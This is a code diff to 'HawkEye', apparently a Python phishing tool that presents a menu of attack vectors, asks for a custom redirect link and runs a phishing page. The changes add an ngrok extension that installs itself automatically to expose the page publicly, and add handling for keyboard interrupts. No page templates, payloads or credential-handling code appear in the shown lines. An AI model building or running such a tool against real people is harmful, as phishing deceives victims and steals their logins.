@@ -1,6 +1,7 @@
 import multiprocessing
 import pathlib
 from os import system
+from exts.ngrok import Ngrok
 
 MAGENTA, BLUE, RED, WHITE, CYAN, GREEN, DEFAULT  = '\033[35m', '\u001b[34;1m' , '\033[1;91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
 
@@ -48,9 +49,13 @@ class HawkEye(object):
             except ValueError as e:
                 print('Value must be an integer!')
 
-        custom_option = self.load_attack(self.attack_vectors[attack_resp])
-        self.custom_input()
-        self.run_phishing(self.attack_vectors[attack_resp], custom_option)
+        try:
+            custom_option = self.load_attack(self.attack_vectors[attack_resp])
+            self.custom_input()
+            self.run_phishing(self.attack_vectors[attack_resp], custom_option)
+        except KeyboardInterrupt:
+            print(f"\n{RED}Taking a step back...{DEFAULT}")
+            self.generate_menu()
 
     def custom_input(self):
         custom = input("Custom Redirect Link (Blank to Loop) >>> ")
@@ -105,5 +110,12 @@ class HawkEye(object):
 
 
 if __name__ == '__main__':
-    app = HawkEye()
-    app.generate_menu()
+
+    print('Importing Ngrok Extension...')
+    ngrok_app = Ngrok()
+    print('Checking Ngrok Installation...')
+    if not bool(ngrok_app.installed): 
+        print('No Ngrok installation detected, installing...')
+        ngrok_app.install_ngrok()
+    hawkeye_app = HawkEye()
+    hawkeye_app.generate_menu()
